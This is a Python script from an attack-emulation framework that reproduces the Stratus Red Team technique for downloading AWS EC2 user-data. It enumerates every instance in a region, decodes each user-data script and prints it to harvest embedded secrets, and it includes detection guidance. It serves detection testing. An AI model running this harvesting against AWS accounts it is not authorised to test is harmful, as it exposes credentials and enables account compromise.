"""
Technique : aws.discovery.ec2-download-user-data
Tactic    : Discovery / Credential Access (T1552.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-download-user-data/

Pre-requisites:
  - None. Reads existing EC2 instances in the current account and region.

How the attack works:
  EC2 user-data scripts often contain secrets, environment variables, API keys,
  bootstrap commands, or configuration values that were passed at launch time.
  An attacker with ec2:DescribeInstances + ec2:DescribeInstanceAttribute can
  harvest these scripts from every instance in the account without needing
  direct access to any instance.

Detection signal:
  - ec2:DescribeInstanceAttribute with Attribute=userData called on multiple
    instances in rapid succession.
  - Alert when caller principal is not an expected operations or patch-management
    tool and the call volume is high.

Revert:
  - Nothing to revert (read-only operations).
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import base64

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    ec2_client = session.client("ec2")

    # ── Step 1: Enumerate all instances ──────────────────────────────────────
    banner("Step 1 — Enumerate all EC2 instances (DescribeInstances)")
    instance_ids: list[str] = []
    paginator = ec2_client.get_paginator("describe_instances")
    for page in paginator.paginate():
        for reservation in page.get("Reservations", []):
            for instance in reservation.get("Instances", []):
                state = instance.get("State", {}).get("Name", "unknown")
                if state not in ("terminated", "shutting-down"):
                    instance_ids.append(instance["InstanceId"])

    print(f"  [+] Found {len(instance_ids)} active instance(s)")
    if not instance_ids:
        print("  [~] No instances found in this account/region — nothing to exfiltrate.")
        return

    # ── Step 2: Download user-data from each instance ─────────────────────────
    banner("Step 2 — Download user-data from each instance (DescribeInstanceAttribute)")
    found_count   = 0
    empty_count   = 0
    error_count   = 0

    for instance_id in instance_ids:
        try:
            response = ec2_client.describe_instance_attribute(
                InstanceId=instance_id,
                Attribute="userData",
            )
            raw = response.get("UserData", {}).get("Value", "")
            if raw:
                decoded = base64.b64decode(raw).decode("utf-8", errors="replace")
                found_count += 1
                print(f"\n  Instance: {instance_id}")
                print(f"  {'─' * 50}")
                # Print first 500 chars to avoid flooding output
                preview = decoded[:500]
                for line in preview.splitlines():
                    print(f"    {line}")
                if len(decoded) > 500:
                    print(f"    ... [{len(decoded) - 500} more bytes truncated]")
            else:
                empty_count += 1
                print(f"  [{instance_id}]  (no user-data)")

        except ClientError as exc:
            error_count += 1
            print(f"  [{instance_id}]  ERROR: {exc.response['Error']['Code']}")

    banner("Complete")
    print(f"  Instances enumerated : {len(instance_ids)}")
    print(f"  With user-data       : {found_count}")
    print(f"  Empty                : {empty_count}")
    print(f"  Errors               : {error_count}")
    print()
    print("CloudTrail events: ec2:DescribeInstances, ec2:DescribeInstanceAttribute x N")
    print("\nDetection guidance:")
    print("  Alert on ec2:DescribeInstanceAttribute(userData) called at scale.")
    print("  Rotate any secrets discovered in user-data immediately.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
